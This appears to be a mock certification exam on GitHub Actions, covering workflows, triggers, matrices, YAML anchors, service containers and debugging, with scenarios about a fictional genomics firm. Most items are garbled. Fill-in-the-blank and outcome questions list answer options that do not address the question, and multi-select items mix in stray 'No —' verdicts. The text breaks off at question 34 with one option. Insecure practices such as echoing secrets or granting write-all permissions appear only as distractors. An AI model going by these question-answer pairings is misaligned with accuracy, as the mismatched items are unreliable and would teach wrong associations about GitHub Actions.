# Microsoft / GitHub Exam GH-200: GitHub Actions — Full-Length Mock Exam 3

**Theme:** Custom Action Engineering & Marketplace Distribution — Node 20 Bundling (@vercel/ncc), Docker vs Composite, Immutable Actions & SemVer  
**Credential:** `GitHub Actions` *(Intermediate · **no prerequisite** · **2-year validity** transitioning to Microsoft Learn recertification)*  
**Study guide baseline:** `January 2026 (Last updated February 5, 2026)` (https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200)  
**Questions:** `100` (`84` `multiple-choice` balanced `21/21/21/21` across A–D + `16` `multi-select`; `0` case studies)  
**Recommended timing:** `100 minutes` (matching Microsoft’s published `100-minute` GH-200 assessment duration · **closed-book: no Microsoft Learn or GitHub Docs access**)

> **Disclaimer:** Independent educational material authored from public Microsoft Learn and GitHub Actions documentation — not affiliated with or endorsed by Microsoft Corporation or GitHub, Inc. Practice percentages do not equate to Microsoft’s `700 / 1000` scaled score.

## Questions

---

## Domain 1 — Author and manage workflows (20–25% official weight · 24 questions)

### 1. VireoBio Genomics wants external laboratory LIMS software to trigger `assay-qc.yml` on demand with custom sample metadata (`batch_id`, `sequencer_id`) while keeping `assay-qc.yml` committed on default branch `main`. Proposed solution: Configure `on: repository_dispatch: types: [lims-ready]` on `main`, send `POST /repos/vireobio/assay-kit/dispatches` (`{"event_type":"lims-ready","client_payload":{...}}`), and read `${{ github.event.client_payload.batch_id }}`. Does this meet the goal?

- **A.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)
- **B.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **C.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)
- **D.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement

### 2. In `vireobio/aligner-cli`, workflow `post-ci-scan.yml` declares `on: workflow_run: { workflows: ["Primary CI"], types: [completed], branches: [main] }`. Which two execution rules govern `workflow_run` workflows? Select two.

- **A.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Distinguish `pull_request` (`GITHUB_SHA` = ephemeral test merge commit `refs/pull/:n/merge`) from `push` (`GITHUB_SHA` = branch head commit `refs/heads/<branch>`)
- **D.** Configure `schedule` (POSIX UTC cron on default branch), `workflow_dispatch`, webhook events (`push`, `pull_request`, `release`), and external `repository_dispatch` (`POST /repos/{owner}/{repo}/dispatches`)
- **E.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **F.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)

### 3. In `vireobio/variant-action`, you want `push` commits that ONLY touch Markdown files (`**/*.md`) or `.vscode/**` skipped automatically, while all Rust/TypeScript commits trigger `ci.yml`. Complete the negative path filter under `on: push:`: `____: ['**/*.md', '.vscode/**']` (`noting paths and paths-ignore cannot be combined on the same event`).

- **A.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **D.** Combine activity `types:` (`e.g., [opened, synchronize, reopened]`), `branches`/`paths-ignore` filters, least-privilege `permissions:`, and `concurrency:` groups

### 4. In `vireobio/clinical-core`, upstream `lint` and `unit` jobs should run concurrently across PRs, whereas ONLY job `deploy-qa` must serialize without canceling queued deployments. Complete the job-level `deploy-qa` block: `____: { group: deploy-qa, cancel-in-progress: false }`.

- **A.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **B.** Combine activity `types:` (`e.g., [opened, synchronize, reopened]`), `branches`/`paths-ignore` filters, least-privilege `permissions:`, and `concurrency:` groups
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

### 5. VireoBio Genomics designs an interactive release promotion workflow (`on: workflow_dispatch`) and a shared validation callee (`on: workflow_call`) for `vireobio/assay-kit`. Which two input/secret design capabilities are supported natively? Select two.

- **A.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **B.** Define typed `workflow_dispatch.inputs` (`string`, `boolean`, `choice`, `number`, `environment`) and map `workflow_call` `inputs:` + `secrets:` explicitly
- **C.** Define `on.workflow_dispatch.inputs` (`choice`, `boolean`, `environment`, `string`) for validated manual runs and `on.workflow_call` for cross-workflow reuse
- **D.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **E.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **F.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file

### 6. VireoBio Genomics centralizes container SBOM generation in `vireobio/ci-core/.github/workflows/sbom.yml` and needs `vireobio/aligner-cli` to pass image refs + registry credentials and consume the resulting SPDX digest in a downstream attestation job. Order the callee and caller steps.

- **A.** Declare `on: workflow_call` (`inputs`, `secrets`, `outputs`) in callee → Write callee step result to `$GITHUB_OUTPUT` & job `outputs` → Invoke `jobs.<id>.uses` (`@<sha>`) with `with:` & `secrets:` → Read `needs.<id>.outputs.<key>` downstream
- **B.** Read `needs.<id>.outputs` before running the callee job → Declare `on: workflow_dispatch` only in the callee → Emit outputs with retired `::set-output` syntax → Hardcode org secrets inside YAML
- **C.** Place the reusable workflow outside `.github/workflows/` → Call it inside `steps:` instead of `jobs.<id>.uses` → Omit `on.workflow_call.outputs` mapping → Expect secrets to pass implicitly without `secrets:`
- **D.** Invoke `uses:` without `on: workflow_call` in callee → Write values to `$GITHUB_ENV` hoping they cross jobs → Read `steps.ci.outputs` across separate runner VMs → Pass sensitive secrets via plaintext `with:` inputs

### 7. In `vireobio/aligner-cli`, job `gpu-benchmark` sets `continue-on-error: ${{ matrix.experimental }}` (`true` ONLY for the `cuda-13-preview` leg). When `cuda-13-preview` exits with code `1` while stable legs exit `0`, what overall status does the workflow run report?

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** Control job/step flow with `if:` status functions (`success()`, `failure()`, `always()`, `cancelled()`), `continue-on-error`, and `timeout-minutes`
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`

### 8. A step in `vireobio/assay-kit` specifies `if: github.event_name == 'pull_request'` with NO explicit status check function (`such as always() or failure()`). If an earlier step in the same job exits with code `2`, does this step run?

- **A.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **B.** Control job/step flow with `if:` status functions (`success()`, `failure()`, `always()`, `cancelled()`), `continue-on-error`, and `timeout-minutes`
- **C.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)

### 9. In `vireobio/genome-indexer`, job `page-oncall` declares `needs: [validate, integration, smoke]` and must fire ONLY if at least one upstream job in its `needs` chain failed. Complete the job-level condition: `if: ____`.

- **A.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Chain jobs into a DAG via `needs: [build, lint]`, reading upstream `needs.<job_id>.outputs.<key>` and `needs.<job_id>.result`
- **D.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file

### 10. Developer PRs in `vireobio/variant-action` fail YAML parsing with `Workflow is invalid: Job 'package' depends on job 'sign', which creates a cycle`. What graph constraint does `jobs.<job_id>.needs` enforce?

- **A.** Chain jobs into a DAG via `needs: [build, lint]`, reading upstream `needs.<job_id>.outputs.<key>` and `needs.<job_id>.result`
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** Use the official **GitHub Actions VS Code extension** for live YAML schema validation, `action.yml` input IntelliSense, context/secrets hover checks, and run management
- **D.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name

### 11. During a specialist custom step in `vireobio/assay-kit`, a vendor binary outputs literal text containing `::warning::` from raw FASTQ sample headers that you do NOT want parsed as Actions workflow commands. Complete the workflow command pair `echo "____::<unique-token>"` and `echo "::<unique-token>::"` that temporarily suspends workflow command parsing.

- **A.** No — interpolating `${{ github.event.pull_request.title }}` (`or head_ref / comment.body`) directly inside `run:` allows shell command injection; bind it to an `env:` variable first
- **B.** Append `KEY=VALUE` to `$GITHUB_ENV`, paths to `$GITHUB_PATH`, outputs to `$GITHUB_OUTPUT`, and emit `::notice::` / `::error::` / `::add-mask::` commands
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 12. Platform engineers at VireoBio Genomics refactor `.github/workflows/ci.yml` to eliminate repeated `env:` dictionaries and modernize step outputs/PATH exports. Which three techniques are supported natively? Select three.

- **A.** Define YAML anchors (`&base_env`), aliases (`*base_env`), and merge keys (`<<: *base_env`) to deduplicate repeated mappings or job blocks inside one `.yml` file
- **B.** Use YAML anchors (`&common`), aliases (`*common`), and map merges (`<<: *common`) to share repeated `env:` or step/job settings within a single `.yml` file
- **C.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **E.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **F.** Append `KEY=VALUE` to `$GITHUB_ENV`, paths to `$GITHUB_PATH`, outputs to `$GITHUB_OUTPUT`, and emit `::notice::` / `::error::` / `::add-mask::` commands

### 13. In `vireobio/assay-kit`, job `minio-e2e` declares `services: minio: { image: quay.io/minio/minio, options: >- --health-cmd "curl -f http://localhost:9000/minio/health/live" --health-interval 5s --health-retries 5 }`. Complete the `services.minio` key `____: ['9000:9000']` required when steps run directly on the Ubuntu host VM.

- **A.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions
- **B.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **C.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **D.** Configure `jobs.<id>.services` (`image`, `env`, `ports`, `--health-cmd` `options`), connecting via `localhost:<port>` on host runners or `<label>:<port>` in job `container:`

### 14. VireoBio Genomics tests clinical metadata migrations in `vireobio/lims-bridge` against a PostgreSQL 16 service container. Order the `services.postgres` declaration, port/network setup, health-probe wait, and client connection steps.

- **A.** Define `services.postgres` with `env` & `--health-cmd pg_isready` → Map `ports: ["5432:5432"]` (host) or set job `container:` → Wait for `postgres` health probe to report `healthy` → Dial `localhost:5432` (host) or `postgres:5432` (container)
- **B.** Configure `services.postgres` on a `macos-latest` host without Docker → Echo raw DB passwords in step logs → Expect container data to persist into separate downstream jobs → Tear down Docker manually in `post:`
- **C.** Nest `services:` inside an individual `steps:` item → Run inside a job `container:` yet dial `127.0.0.1:5432` → Disable health probes completely → Store DB passwords in unencrypted `vars.*`
- **D.** Run integration tests before `services.postgres` starts → Omit `ports:` on a host-runner job yet query `postgres:5432` → Skip `--health-cmd` readiness checks → Declare `services:` after test steps finish

### 15. In `vireobio/aligner-cli`, you build native SIMD wheels across x64 Linux AND ARM64 Linux GitHub-hosted runners (`ubuntu-24.04` and `ubuntu-24.04-arm`). Complete the matrix expression `runs-on: ${{ ____ }}` when `strategy.matrix.runner: [ubuntu-24.04, ubuntu-24.04-arm]`.

- **A.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **B.** Use `strategy.matrix` (`include`, `exclude`, `fail-fast`, `max-parallel`, `<=256` jobs) and track hosted image migrations (`Ubuntu 20.04` retired; `windows-latest` -> Windows Server 2025)
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners

### 16. In `vireobio/variant-action`, a matrix defines `node: [20, 22]` and `os: [ubuntu-24.04, macos-15, windows-2025]` (`6 combinations`), plus `exclude: [{ os: macos-15, node: 20 }]` and `strategy.max-parallel: 3`. Which two execution properties hold? Select two.

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions
- **C.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **E.** Use `strategy.matrix` (`include`/`exclude`, `fail-fast: false`, `max-parallel`) while pinning explicit runner OS images (`ubuntu-24.04`, `windows-2025`)
- **F.** Use `strategy.matrix` (`include`, `exclude`, `fail-fast`, `max-parallel`, `<=256` jobs) and track hosted image migrations (`Ubuntu 20.04` retired; `windows-latest` -> Windows Server 2025)

### 17. In `vireobio/assay-kit/.github/workflows/build.yml`, you anchor a shared cache configuration mapping `&cargo_cache_with { path: ~/.cargo, key: linux-cargo-v1 }` on job 1's `actions/cache@v4` `with:` block and reuse `with: *cargo_cache_with` on job 2 in the same file. Complete the YAML syntax operator `____cargo_cache_with` that dereferences an existing `&cargo_cache_with` anchor.

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Define YAML anchors (`&base_env`), aliases (`*base_env`), and merge keys (`<<: *base_env`) to deduplicate repeated mappings or job blocks inside one `.yml` file
- **C.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

### 18. Inside `vireobio/variant-action`, you need to know the exact repository + path of the currently executing workflow (`for OIDC/audit logging`) even when invoked via `workflow_call`. Complete the `github` context property `${{ github.____ }}` (`as opposed to github.workflow`).

- **A.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** Read runtime metadata from contexts (`github`, `runner`, `env`, `vars`, `secrets`, `inputs`, `matrix`, `needs`, `steps`) and account for Immutable Actions (`GHCR` OCI packages)

### 19. Why does combining Immutable Actions (`GHCR` OCI action packages) with 40-character commit SHA pinning (`uses: actions/attest-build-provenance@<40-char-sha>`) provide stronger defense-in-depth than relying on floating `@v2` tags alone?

- **A.** Read runtime metadata from contexts (`github`, `runner`, `env`, `vars`, `secrets`, `inputs`, `matrix`, `needs`, `steps`) and account for Immutable Actions (`GHCR` OCI packages)
- **B.** Block outbound HTTPS `443` to `pkg.actions.githubusercontent.com` and `ghcr.io` on self-hosted runner firewalls while forcing Immutable Actions
- **C.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

### 20. A release step in `vireobio/aligner-cli` formats tag announcements and serializes the entire `github` context to debug JSON on failure. Complete the two built-in expression functions: `${{ ____('Release {0} by {1}', github.ref_name, github.actor) }}` and `${{ ____(github) }}`.

- **A.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Evaluate `${{ ... }}` built-in functions (`contains`, `startsWith`, `format`, `join`, `toJSON`, `fromJSON`, `hashFiles`), separating parse-time keys from runtime step contexts
- **D.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step

### 21. A bioinformatics engineer authors `.github/workflows/pipeline.yml` in Visual Studio Code with the official GitHub Actions extension installed. Without leaving VS Code, which two workflow management operations can they trigger from the GitHub Actions sidebar view?

- **A.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **B.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **C.** Use the official **GitHub Actions VS Code extension** for live YAML schema validation, `action.yml` input IntelliSense, context/secrets hover checks, and run management
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 22. VireoBio Genomics wants permanent FDA-auditable clinical software releases stored for `7 years` so customers can download signed binaries from GitHub. Proposed solution: Store the 7-year clinical release binaries exclusively in `actions/cache@v4` (`with a unique release key`) instead of GitHub Releases. Does this meet the goal?

- **A.** Manage v4 immutable artifacts (`actions/upload-artifact@v4` creates immediate finalized artifacts; use unique names per matrix leg + `download-artifact@v4` `pattern:` + `merge-multiple: true`)
- **B.** Pair `actions/cache@v4` (`10 GB` repo cache, `7-day` idle eviction) with `actions/upload-artifact@v4` (`retention-days`) and REST retention policies
- **C.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)
- **D.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement

### 23. In `vireobio/assay-kit`, matrix job `shard-test` (`4 shards`) runs in parallel and you wonder what value `${{ needs.shard-test.outputs.summary }}` holds if all 4 matrix shards write to the same job output key `summary`. What actually happens?

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **C.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **D.** Pass intra-job values via `$GITHUB_OUTPUT` / `$GITHUB_ENV` (`steps.<id>.outputs`), cross-job primitives via `jobs.<id>.outputs` (`needs`), and binary files via v4 artifacts

### 24. VireoBio Genomics embeds a status badge for `ci.yml` inside `README.md` of a `Private` repository `vireobio/clinical-core`. Who can render that `.../actions/workflows/ci.yml/badge.svg` image in their browser?

- **A.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Write GitHub Flavored Markdown tables/charts to `$GITHUB_STEP_SUMMARY` (`<=1 MB`/step) and embed branch/event-scoped workflow status badges (`badge.svg`)
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)

---

## Domain 2 — Consume and troubleshoot workflows (15–20% official weight · 19 questions)

### 25. A maintainer pushes a commit containing `[skip ci]` in the commit message subject to branch `main` in `vireobio/aligner-cli`. Which workflow triggers are skipped automatically by `[skip ci]` (`or [ci skip] / [no ci]`), and which triggers still run?

- **A.** Distinguish `pull_request` (`GITHUB_SHA` = ephemeral test merge commit `refs/pull/:n/merge`) from `push` (`GITHUB_SHA` = branch head commit `refs/heads/<branch>`)
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** No — `on: pull_request_target` runs with base-repo `secrets.*` and write-capable `GITHUB_TOKEN`; checking out and executing untrusted fork PR code leaks secrets immediately
- **D.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)

### 26. In `vireobio/variant-action`, workflow `lint.yml` configures `on: { pull_request: { branches-ignore: ['experimental/**'] } }`. An engineer opens PR `#82` from head branch `experimental/simd` targeting base branch `main` and expects `lint.yml` to skip, yet `lint.yml` RUNS! Why?

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Distinguish `pull_request` (`GITHUB_SHA` = ephemeral test merge commit `refs/pull/:n/merge`) from `push` (`GITHUB_SHA` = branch head commit `refs/heads/<branch>`)
- **C.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **D.** Configure `schedule` (POSIX UTC cron on default branch), `workflow_dispatch`, webhook events (`push`, `pull_request`, `release`), and external `repository_dispatch` (`POST /repos/{owner}/{repo}/dispatches`)

### 27. A bash step in `vireobio/assay-kit` runs `curl -sS https://internal.example/health | grep -q ok; echo "done"`. Even when `curl` fails TLS verification, why might subtle pipeline errors occur if someone overrides `shell: sh {0}`, versus GitHub Actions' default `shell: bash` flags?

- **A.** Enable diagnostic traces (`Re-run jobs -> Enable debug logging`, or set `ACTIONS_STEP_DEBUG=true` and `ACTIONS_RUNNER_DEBUG=true`) and inspect step exit codes (`127`, `137`, `143`)
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **D.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step

### 28. When `ACTIONS_STEP_DEBUG` is enabled (`true`) on a run in `vireobio/variant-action`, which `@actions/core` logging function inside custom JavaScript actions begins emitting `##[debug]` diagnostic messages into step logs?

- **A.** Enable diagnostic traces (`Re-run jobs -> Enable debug logging`, or set `ACTIONS_STEP_DEBUG=true` and `ACTIONS_RUNNER_DEBUG=true`) and inspect step exit codes (`127`, `137`, `143`)
- **B.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)

### 29. A self-hosted runner executing `vireobio/genome-indexer` disconnects mid-step with `The self-hosted runner: bio-gpu-04 lost communication with the server`. Which two diagnostic checks pinpoint whether host OOM/network loss or worker crash caused the disconnect? Select two.

- **A.** Use `Re-run failed jobs` with `Enable debug logging` (`setting ACTIONS_STEP_DEBUG and ACTIONS_RUNNER_DEBUG`) to diagnose flaky variants cleanly
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Enable diagnostic traces (`Re-run jobs -> Enable debug logging`, or set `ACTIONS_STEP_DEBUG=true` and `ACTIONS_RUNNER_DEBUG=true`) and inspect step exit codes (`127`, `137`, `143`)
- **D.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)
- **E.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **F.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

### 30. In `vireobio/assay-kit/.github/workflows/ci.yml`, job 1 defines `defaults: &rust_defaults { run: { shell: bash, working-directory: crates/core } }` and job 2 writes `defaults: *rust_defaults`. At runtime, which steps in job 2 execute inside `crates/core`?

- **A.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Trace YAML anchor (`&`), alias (`*`), and merge (`<<:`) resolution order—where local explicit keys defined alongside `<<: *anchor` override anchored defaults
- **D.** Pass intra-job values via `$GITHUB_OUTPUT` / `$GITHUB_ENV` (`steps.<id>.outputs`), cross-job primitives via `jobs.<id>.outputs` (`needs`), and binary files via v4 artifacts

### 31. In `vireobio/aligner-cli/.github/workflows/release.yml`, three jobs share 5 environment variables except `RUSTFLAGS`. Proposed solution: Define `env: &shared_env { CARGO_TERM_COLOR: always, BACKTRACE: "1", RUSTFLAGS: "-Dwarnings" }` in job 1 and write `env: { <<: *shared_env, RUSTFLAGS: "-C target-cpu=native" }` in job 2 inside the SAME `release.yml` file. Does this meet the goal?

- **A.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **B.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement
- **C.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **D.** No — a **Starter workflow** (`.github/workflow-templates/`) copies a one-time static `.yml` file into target repos; future edits never propagate unless you use a `workflow_call` Reusable Workflow

### 32. In `vireobio/variant-action`, you fix an expired staging secret stored in `Environment: staging` after a deployment job failed 10 minutes ago (`without changing any code or .yml files`). When you trigger `Re-run failed jobs`, which secret value and `GITHUB_SHA` does the retried job use?

- **A.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **B.** Correlate failed matrix job titles to `matrix.*` axes and select `Re-run failed jobs` (`gh run rerun <id> --failed` or single-job rerun) to re-test without re-billing green legs
- **C.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **D.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)

### 33. One leg `(macos-15, python-3.13)` of VireoBio Genomics' 12-leg native extension build fails during `cibuildwheel` linking while 11 legs pass. Order the matrix correlation, log inspection, selective debug re-run, and fix verification steps.

- **A.** Delete `.github/workflows` to hide red checks → Re-run all 48 green matrix legs ten times without reading logs → Run `echo ${{ secrets.PROD_KEY }}` in bash → Set `continue-on-error: true` permanently on test steps
- **B.** Leave `ACTIONS_STEP_DEBUG=true` enabled org-wide forever → SSH directly into standard GitHub-hosted runner VMs on port 22 → Download test artifacts before the upload step executes → Bypass branch protection to merge broken code
- **C.** Wait 90 days until workflow logs expire → Mask exit codes with `|| true` across test scripts → Fire unrelated `release` webhooks manually → Search `_diag/` logs on developer laptops
- **D.** Map the failed job in the run graph to its `matrix` axes → Check step logs for the first non-zero exit / `::error::` → Run `Re-run failed jobs` with `Enable debug logging` → Push the fix and verify all matrix variants pass

### 34. In the GitHub Actions web UI search bar of `vireobio/aligner-cli`, a release manager wants to filter the workflow runs list to show ONLY failed `schedule` runs triggered on branch `main`. Complete the Actions UI filter query: `branch:main ____ event:schedule`.

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
